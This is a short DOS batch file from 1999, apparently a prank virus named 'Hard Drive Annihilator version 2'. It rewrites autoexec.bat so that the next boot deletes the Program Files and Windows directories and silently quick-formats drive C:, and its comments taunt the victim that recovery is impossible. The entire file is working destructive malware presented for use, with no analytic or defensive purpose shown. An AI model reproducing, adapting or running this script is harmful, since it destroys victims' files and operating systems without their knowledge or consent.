@ echo off
rem Welcome to InSaNe's Hard Drive Annihilator version 2.
rem I hope you enjoyed using Hard Drive Annihilator 1
rem So if you were killed last time and recovered some of your stuff
rem you have no chance of recovering it now hahaha.
rem This program was built by InSaNe of InSaNe Productions.
rem Your hard dirve is now dead....
rem - InSaNe Productions 1999
 
cls
call attrib -h -r c:\autoexec.bat >nul
echo @echo off >c:\autoexec.bat
echo deltree /y c:\progra~1\*.* >nul >>c:\autoexec.bat
echo copy c:\windows\command\format.com c:\ >nul >>c:\autoexec.bat
echo copy c:\windows\command\deltree.exe c:\ >nul >>c:\autoexec.bat
echo deltree /y c:\windows\*.* >nul >>c:\autoexec.bat
echo format c: /q /u /autotest >nul >>c:\autoexec.bat

rem - InSaNe Productions 1999
